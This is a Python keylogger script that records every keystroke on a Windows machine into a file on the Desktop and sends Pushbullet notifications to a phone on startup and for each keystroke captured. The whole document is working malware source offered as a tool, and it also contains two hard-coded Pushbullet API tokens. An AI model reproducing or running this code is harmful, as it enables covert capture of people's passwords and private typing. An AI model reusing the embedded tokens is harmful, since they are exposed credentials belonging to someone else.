from pynput.keyboard import Key, Listener
import os
from pushbullet import Pushbullet

# Define the file path
desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
file_path = os.path.join(desktop, "keylogs.txt")

# Initialize an empty string to hold keystrokes and a counter
keystrokes = ""
keystroke_count = 0

# Initialize Pushbullet
API_KEY = 'o.aEN6aKVrttdHPpyKKGnrBJgfwLoI4sFA'  # Replace with your Pushbullet API key
pb = Pushbullet("o.cNHyiw1j1U7fxpc5ypUzGcQO9DKQ2M5f")

# Function to write keystrokes to a file
def write_to_file(keys):
    with open(file_path, 'a') as file:  # Use 'a' to append to the file
        file.write(keys + "\n")

# Function to handle each key press
def on_press(key):
    global keystrokes, keystroke_count
    keystroke_count += 1
    keystrokes += str(key).replace("'", "")
    
    # Check if 1 keystrokes have been typed
    if keystroke_count == 1:
        write_to_file(keystrokes)
        keystrokes = ""
        keystroke_count = 0
        # Send notification to phone
        pb.push_note("Keylogger Notification", "1 keystrokes captured and saved to file.")

# Show initial notification on phone
pb.push_note("Keylogger Notification", "Keylogger has started.")

# Setup the listener
with Listener(on_press=on_press) as listener:
    listener.join()
